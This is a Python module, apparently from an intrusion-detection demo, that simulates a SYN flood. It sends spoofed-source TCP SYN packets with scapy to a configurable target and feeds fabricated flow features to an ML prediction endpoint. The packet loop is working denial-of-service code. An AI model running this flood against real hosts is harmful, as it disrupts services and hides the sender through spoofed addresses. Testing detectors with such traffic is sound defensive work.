from scapy.all import IP, TCP, send, RandShort
import asyncio
from typing import Dict, Any, Callable, Coroutine
from .simulation_params import SYNFloodParams
from app.core import state
import random
import httpx
import os

INTERNAL_API_BASE_URL = os.getenv("INTERNAL_API_BASE_URL", "http://localhost:8000")

def generate_fake_synflood_features():
    """SYN Flood saldırısını, veri setindeki istatistiksel profillere daha yakın taklit eder."""
    if not state.feature_columns:
        print("⚠️ Feature columns not loaded for SYN Flood.")
        return {}
    
    features = {key: 0.0 for key in state.feature_columns}
    
    features.update({
        'Flow Duration': abs(random.gauss(2000, 1000)), 
        'Total Fwd Packets': 1.0,
        'Total Backward Packets': 0.0,
        'Fwd Packet Length Max': 0.0,
        'Fwd Packet Length Mean': 0.0,
        'Bwd Packet Length Mean': 0.0,
        'Flow IAT Mean': abs(random.gauss(50, 30)),
        'Flow IAT Min': abs(random.gauss(10, 5)),
        'SYN Flag Count': 1,
        'Average Packet Size': 0.0,
    })
    return features

async def trigger_prediction(simulation_id: str):
    """AI modelinin tahmin endpoint'ini tetikler."""
    try:
        features = generate_fake_synflood_features()
        fake_source_ip = f"10.42.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{INTERNAL_API_BASE_URL}/api/predict",
                json={
                    "features": features,
                    "source_info": f"synflood_sim_{fake_source_ip}",
                    "simulation_id": simulation_id
                },
                timeout=10.0
            )
    except Exception as e:
        print(f"❌ Error during SYN Flood prediction trigger: {e}")

async def run_synflood_simulation(
    params: SYNFloodParams,
    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]],
    simulation_run_id: str
) -> Dict[str, Any]:
    print(f"Starting SYN Flood Simulation: Target={params.target_ip}:{params.target_port}")
    sent_packets = 0
    await progress_callback({"type": "progress", "message": "Initiating SYN Flood...", "completed": 0, "total": params.num_packets})
    try:
        for i in range(params.num_packets):
            source_ip = f"192.168.1.{random.randint(1, 254)}"
            ip_layer = IP(src=source_ip, dst=params.target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=params.target_port, flags="S")
            packet = ip_layer / tcp_layer
            send(packet, verbose=0)
            sent_packets += 1
            if sent_packets % 50 == 0 or sent_packets == params.num_packets:
                await progress_callback({"type": "progress", "message": f"Sent {sent_packets}/{params.num_packets} SYN packets...", "completed": sent_packets, "total": params.num_packets})
                asyncio.create_task(trigger_prediction(simulation_run_id))
            if params.delay_seconds > 0:
                await asyncio.sleep(params.delay_seconds)
    except Exception as e:
        error_message = f"An error occurred during SYN Flood: {e}. Note: Sending raw packets might require root/administrator privileges."
        print(f"❌ {error_message}")
        await progress_callback({"type": "error", "message": error_message})
        return {"target_ip": params.target_ip, "target_port": params.target_port, "total_packets_sent": sent_packets, "status": "Failed", "error": str(e)}
    result = {"target_ip": params.target_ip, "target_port": params.target_port, "total_packets_sent": sent_packets, "status": "Completed"}
    await progress_callback({"type": "final_summary", "message": "SYN Flood simulation completed."})
    return result